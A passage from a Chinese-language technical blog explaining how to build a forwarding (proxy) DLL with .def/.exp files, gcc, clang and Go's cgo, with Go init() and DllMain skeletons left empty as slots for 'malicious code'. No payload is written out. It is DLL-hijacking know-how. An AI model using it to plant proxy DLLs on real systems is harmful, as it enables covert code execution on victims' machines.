<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>LIBRARY _add.dll
EXPORTS
    add = _add.add @1
</code></pre></td></tr></table>
</div>
</div><p><code>LIBRARY _add.dll</code> 代表转发到 <code>_add.dll</code>，下面的 <code>EXPORTS</code> 定义了需要转发的函数，<code>=</code> 前面是导出函数名，<code>=</code> 后面的 <code>_add</code> 代表要转发到的 dll 的名称，<code>add</code> 代表要转发到 <code>_add.dll</code> 的哪一个导出函数，关键在于 <code>@1</code></p>
<p>我们可以拿 <a href=http://www.nirsoft.net/utils/dll_export_viewer.html>DLL Export Viewer</a> 或 <a href=https://bbs.pediy.com/thread-246459-1.htm>StudyPE+</a> 等工具看看</p>
<p><img loading=lazy src=https://raw.githubusercontents.com/akkuman/pic/master/pic/2021/8/11966852dadead4c55784b42932aada0..png alt="enter description here">
</p>
<p>我们可以看到 <code>Ordinal</code>, 这个是导出函数序号，就是 <code>@1</code> 的来源，如果有多个导出函数，依次写下来即可</p>
<p>然后编写我们的恶意 dll</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
BOOL APIENTRY <span style=color:#a6e22e>DllMain</span>(HANDLE handle, DWORD dword, LPVOID lpvoid)
{

	<span style=color:#66d9ef>return</span> true;
}
</code></pre></td></tr></table>
</div>
</div><p>如上所示，当然，这只是一个样例，所以我并没有写下任何恶意代码</p>
<p><strong>现在可以编译我们的恶意dll了</strong></p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>gcc -shared -o add.dll evil.cpp functions.def
</code></pre></td></tr></table>
</div>
</div><ol>
<li>-shared表示我们要编译一个共享库（非静态）</li>
<li>-o指定可执行文件的输出文件名</li>
<li>add.dll是我们想给我们的恶意 dll 起的名字</li>
<li>evil.cpp是我们在其中编写恶意 dll 代码的 .cpp 文件</li>
</ol>
<p>如果编译成功的话，你应该能在同目录下找到刚刚生成好的恶意 dll（add.dll）</p>
<p>我们再使用 PE 查看工具看看导出表</p>
<p><img loading=lazy src=https://raw.githubusercontents.com/akkuman/pic/master/pic/2021/8/2d51619698b2756e0db20e1ae24ac66d..png alt="enter description here">
</p>
<p>可以看到中转输出表上已经有了</p>
<p>注意我们这个 dll 并没有写任何功能性代码，让我们使用刚才编译的 main.exe 测试一下</p>
<p><img loading=lazy src=https://raw.githubusercontents.com/akkuman/pic/master/pic/2021/8/aa70cfe03369503bbd2d14f646e736a3..png alt="enter description here">
</p>
<p>可以发现功能转发正常</p>
<p>当然，当导出函数过多的时候我们不可能一个个自己去导出表里抄，可以写一个脚本自动化完成这个工作，不过这不是我们本文的重点，或者你可以使用 mingw-w64 里面自带的 gendef.exe 工具</p>
<h4 id=def-和-exp-文件>.def 和 .exp 文件<a hidden class=anchor aria-hidden=true href=#def-和-exp-文件>#</a></h4>
<p><strong>exp</strong>：</p>
<p>文件是指导出库文件的文件，简称导出库文件，它包含了导出函数和数据项的信息。当LIB创建一个导入库，同时它也创建一个导出库文件。如果你的程序链接到另一个程序，并且你的程序需要同时导出和导入到另一个程序中，这个时候就要使用到exp文件(LINK工具将使用EXP文件来创建动态链接库)。</p>
<p><strong>def</strong>：</p>
<p>def文件的作用即是，告知编译器不要以microsoft编译器的方式处理函数名，而以指定的某方式编译导出函数（比如有函数func，让编译器处理后函数名仍为func）。这样，就可以避免由于microsoft VC++编译器的独特处理方式而引起的链接错误。</p>
<p>从上面的介绍中我们可以看出 .exp 文件可以用在链接阶段，所以我们可以先使用 <code>dlltool</code> 工具将 .def 转化为 .exp 文件，然后编译 <code>evil.cpp</code> 到 <code>evil.o</code> 再手动进行链接。</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>gcc -c -O3 evil.cpp
dlltool --output-exp functions.exp --input-def functions.def
ld -o add.dll functions.exp evil.o
</code></pre></td></tr></table>
</div>
</div><h4 id=额外的说明>额外的说明<a hidden class=anchor aria-hidden=true href=#额外的说明>#</a></h4>
<p>当然，你也可以通过 clang 来完成这项工作</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>clang -shared evil.cpp -o add.dll -Wl<span style=color:#e6db74>&#34;/DEF:functions.def&#34;</span>
</code></pre></td></tr></table>
</div>
</div><h2 id=我们如何用-golang-来实现转发-dll>我们如何用 Golang 来实现转发 dll<a hidden class=anchor aria-hidden=true href=#我们如何用-golang-来实现转发-dll>#</a></h2>
<p>Golang 提供了官方的动态链接库（dll）编译命令 <code>go build -buildmode=c-shared -o exportgo.dll exportgo.go</code>，根据我们前面铺垫的基础，现阶段所需要思考的是：<strong>如何把 .def 文件或 .exp 文件也带入进去？</strong></p>
<p>下文我将用 gcc 作为 cgo 的外部链接器，clang也可以按照同样的思想</p>
<h3 id=尝试与思考>尝试与思考<a hidden class=anchor aria-hidden=true href=#尝试与思考>#</a></h3>
<p>为什么不考虑利用cgo直接在c代码中写 <code>#progma comment(linker, '/EXPORT')</code>，这个的主要原因是 Golang 的 cgo 能力现阶段只支持 clang 和 gcc，MSVC编译器并不支持<a href=#refer-anchor><sup>9</sup></a>。</p>
<p>让我们现在来思考一下整个编译流程：</p>
<ul>
<li><strong>预处理</strong>
预处理用于将所有的#include头文件以及宏定义替换成其真正的内容</li>
<li><strong>编译</strong>
将经过预处理之后的程序转换成特定汇编代码(assembly code)的过程</li>
<li><strong>汇编</strong>
汇编过程将上一步的汇编代码转换成机器码(machine code)，这一步产生的文件叫做目标文件，是二进制格式。gcc汇编过程通过as命令完成，这一步会为每一个源文件产生一个目标文件</li>
<li><strong>链接</strong>
链接过程将多个目标文以及所需的库文件(.so等)链接成最终的可执行文件(executable file)。</li>
</ul>
<p>前三步都是在将代码处理成二进制机器码，而我们<strong>所要操控的导出表是属于文件格式的一部分，所以应该是需要在链接这个步骤做文章</strong></p>
<p>借助这个思路，我们对上面的样例做做文章。</p>
<p>首先把我们的 <code>evil.cpp</code> 编译汇编成目标文件，然后链接时加入额外控制。</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># evil.cpp 编译汇编成 evil.o 目标文件（下面的 -O3 是为了启用 O3 优化，可选）</span>
gcc -c O3 evil.cpp
<span style=color:#75715e># 和 .def 文件一起进行链接</span>
ld -o add.dll functions.def evil.o
</code></pre></td></tr></table>
</div>
</div><p>或者利用上文中先将 .def 转化成 .exp 再进行手动链接，我们均能得到我们预期的转发dll。</p>
<h3 id=golang-中的实现>golang 中的实现<a hidden class=anchor aria-hidden=true href=#golang-中的实现>#</a></h3>
<p>我们的目的是需要把 .def 或 .exp 文件放入整个编译流程的链接环节中去。</p>
<p>首先我们需要先了解一下 cgo 的工作方式<a href=#refer-anchor><sup>11</sup></a>：它用c编译器编译c，用Go编译器编译Go，然后使用 gcc 或 clang 将他们链接在一起，我们甚至能够通过 CGO_LDFLAGS 来将flag传递至链接器。</p>
<p>在我们Golang程序编译命令中，相信大家使用过 <code>-ldflags=""</code> 选项，这个其实是 <code>go tool link</code> 带来的，go build 只是一个前端，Go 提供了一组低级工具来编译和链接程序，go build只需收集文件并调用这些工具。我们可以通过使用-x标志来跟踪它的作用。不过这里我们并不关心这个。</p>
<p>我们去看看 <a href=https://pkg.go.dev/cmd/link>go tool link的说明书</a>，帮助文件里面提到了</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>-extld linker
	Set the external linker (default &#34;clang&#34; or &#34;gcc&#34;).
-extldflags flags
	Set space-separated flags to pass to the external linker.
</code></pre></td></tr></table>
</div>
</div><p><code>-extld</code> 一般我们不需要更改，也就是我们只需要想办法修改 <code>-extldflags</code> 让链接过程带入我们的 .def 或 .exp 文件即可。</p>
<p>但是，我们刚才使用 <code>ld</code> 编译的时候，都是直接将 .def 或 .exp 文件传入的，如何通过 <code>ld</code> 的参数传入呢？</p>
<p>在 <a href=https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html>gcc 的链接选项</a> 里，有一个选项是 <code>-Wl</code>，用法为 <code>-Wl,option</code>，它的作用就是将<code>-Wl</code>后的option作为标识传递给 <code>ld</code> 命令，如果 option 中包含 <code>,</code>，则根据 <code>,</code> 拆分为多个标识传递给 <code>ld</code>，可能看到这里你对于这个选项还是一知半解，下面举个例子</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>gcc -c evil.cpp
ld -o add.dll functions.def evil.o
</code></pre></td></tr></table>
</div>
</div><p>等同于</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>gcc -shared -o add.dll -Wl,functions.def evil.cpp
</code></pre></td></tr></table>
</div>
</div><p>等同于</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>gcc -shared -Wl,functions.def,-o,add.dll evil.cpp
</code></pre></td></tr></table>
</div>
</div><p>也就是 <code>-Wl</code> 后面的东西都会传递链接器</p>
<p>所以我们将 .def 或 .exp 文件利用 <code>-Wl</code> 选项设置到 <code>-extldflags</code> 上去即可。</p>
<p>所以我们现在可以创建一个样例 go 程序用来编译 dll</p>
<p>main.go</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-golang data-lang=golang><span style=color:#f92672>package</span> <span style=color:#a6e22e>main</span>

<span style=color:#f92672>import</span> <span style=color:#e6db74>&#34;C&#34;</span>

<span style=color:#66d9ef>func</span> <span style=color:#a6e22e>main</span>() {
	<span style=color:#75715e>// Need a main function to make CGO compile package as C shared library
</span><span style=color:#75715e></span>}
</code></pre></td></tr></table>
</div>
</div><p>然后进行编译</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>go build -buildmode<span style=color:#f92672>=</span>c-shared -o add.dll -ldflags<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;-extldflags=-Wl,C:/Users/Akkuman/Desktop/go-dll-proxy/article/functions.def&#34;</span> main.go
</code></pre></td></tr></table>
</div>
</div><p><strong>注意</strong>：-Wl后面要写上 .def 或 .exp 文件的绝对路径，主要是由于调用程序时候的工作路径问题，只需要记住这一点即可。</p>
<p>现在我们得到了一个 golang 编译出来的转发dll</p>
<p><img loading=lazy src=https://raw.githubusercontents.com/akkuman/pic/master/pic/2021/8/32b11cc70a3603f2e072eddb76c3aea3..png alt="enter description here">
</p>
<p>当然，你可能会对那个 <code>_cgo_dummy_export</code> 导出函数比较疑惑，这个是golang编译的dll所特有的，如果你想要去除掉它，可以使用 .exp 来进行链接</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>go build -buildmode<span style=color:#f92672>=</span>c-shared -o add.dll -ldflags<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;-extldflags=-Wl,C:/Users/Akkuman/Desktop/go-dll-proxy/article/functions.exp&#34;</span> main.go
</code></pre></td></tr></table>
</div>
</div><p><img loading=lazy src=https://raw.githubusercontents.com/akkuman/pic/master/pic/2021/8/3e64ea55782d8c69e229359fc88f1a2e..png alt="enter description here">
</p>
<h2 id=dll-转发的总结>dll 转发的总结<a hidden class=anchor aria-hidden=true href=#dll-转发的总结>#</a></h2>
<p>其实 cgo 主要的编译手段为：用c编译器编译c，用Go编译器编译Go，然后使用 gcc 或 clang 将他们链接在一起。我们所需要做的只是将它们粘合在一起。</p>
<h2 id=在-golang-中如何实现恶意-dll>在 Golang 中如何实现恶意 dll<a hidden class=anchor aria-hidden=true href=#在-golang-中如何实现恶意-dll>#</a></h2>
<p>我们已经知道了该怎么在 Golang 中实现转发 dll，接下来我们可以尝试实现恶意 dll 了。</p>
<h3 id=init-写法>init 写法<a hidden class=anchor aria-hidden=true href=#init-写法>#</a></h3>
<p>如果你看这篇文章，相信你已经知道 Go 会默认执行包中的 init() 方法。所以我们可以把我们的恶意代码定义到这个函数里面去。</p>
<p>一般的dll实现方式为</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-golang data-lang=golang><span style=color:#f92672>package</span> <span style=color:#a6e22e>main</span>

<span style=color:#66d9ef>func</span> <span style=color:#a6e22e>Add</span>(<span style=color:#a6e22e>x</span>, <span style=color:#a6e22e>y</span> <span style=color:#66d9ef>int</span>) <span style=color:#66d9ef>int</span> {
    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>x</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>y</span>
}

<span style=color:#66d9ef>func</span> <span style=color:#a6e22e>main</span>() {
    <span style=color:#75715e>// Need a main function to make CGO compile package as C shared library
</span><span style=color:#75715e></span>}
</code></pre></td></tr></table>
</div>
</div><p>我们只需要加上一个 init 方法，并且让恶意代码异步执行即可（防止 LoadLibrary 卡住）</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-golang data-lang=golang><span style=color:#f92672>package</span> <span style=color:#a6e22e>main</span>

<span style=color:#66d9ef>func</span> <span style=color:#a6e22e>init</span>() {
    <span style=color:#66d9ef>go</span> <span style=color:#66d9ef>func</span>() {
        <span style=color:#75715e>// 你的恶意代码
</span><span style=color:#75715e></span>    }()
}

<span style=color:#66d9ef>func</span> <span style=color:#a6e22e>Add</span>(<span style=color:#a6e22e>x</span>, <span style=color:#a6e22e>y</span> <span style=color:#66d9ef>int</span>) <span style=color:#66d9ef>int</span> {
    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>x</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>y</span>
}

<span style=color:#66d9ef>func</span> <span style=color:#a6e22e>main</span>() {
    <span style=color:#75715e>// Need a main function to make CGO compile package as C shared library
</span><span style=color:#75715e></span>}
</code></pre></td></tr></table>
</div>
</div><h3 id=对于-windows-dll-更细粒度的控制>对于 windows dll 更细粒度的控制<a hidden class=anchor aria-hidden=true href=#对于-windows-dll-更细粒度的控制>#</a></h3>
<p>对于windows dll，DllMain<a href=#refer-anchor><sup>11</sup></a> 是一个可选的入口函数</p>
<p>对于 DllMain 的介绍，我这里就不再赘述了，感兴趣的可以自行进行查询</p>
<p>系统是在什么时候调用DllMain函数的呢？静态链接或动态链接时调用LoadLibrary和FreeLibrary都会调用DllMain函数。DllMain的第二个参数fdwReason指明了系统调用Dll的原因，它可能是:：</p>
<ul>
<li><code>DLL_PROCESS_ATTACH</code>: 当一个DLL文件首次被映射到进程的地址空间时</li>
<li><code>DLL_PROCESS_DETACH</code>: 当DLL被从进程的地址空间解除映射时</li>
<li><code>DLL_THREAD_ATTACH</code>: 当进程创建一线程时，第n(n>=2)次以后地把DLL映像文件映射到进程的地址空间时，是不再用DLL_PROCESS_ATTACH调用DllMain的。而DLL_THREAD_ATTACH不同，进程中的每次建立线程，都会用值DLL_THREAD_ATTACH调用DllMain函数，哪怕是线程中建立线程也一样</li>
<li><code>DLL_THREAD_DETACH</code>: 如果线程调用了ExitThread来结束线程（线程函数返回时，系统也会自动调用ExitThread），系统查看当前映射到进程空间中的所有DLL文件映像，并用DLL_THREAD_DETACH来调用DllMain函数，通知所有的DLL去执行线程级的清理工作</li>
</ul>
<p>这些流程根据你自己的需求来进行控制。当然，如果你有过 Windows 编程经验，应该对这个比较熟悉。</p>
<p>Golang 是一个有 GC 的语言，需要在加载时运行 Golang 本身的运行时，所以暂时没有太好的方案在 Golang 中实现 DllMain 让外层直接调用入口点，因为没有初始化运行时。</p>
<p>我们可以变相通过 cgo 来实现这个目的。总体思路为，利用 C 来写 DllMain，通过 c 来调用 Golang 的函数</p>
<p>以下示例代码大多来自 <a href=https://github.com/NaniteFactory/dllmain>github.com/NaniteFactory/dllmain</a></p>
<h4 id=c-实现-dllmain>c 实现 DllMain<a hidden class=anchor aria-hidden=true href=#c-实现-dllmain>#</a></h4>
<p>首先我们可以在 c 中定义我们自己的 DllMain</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
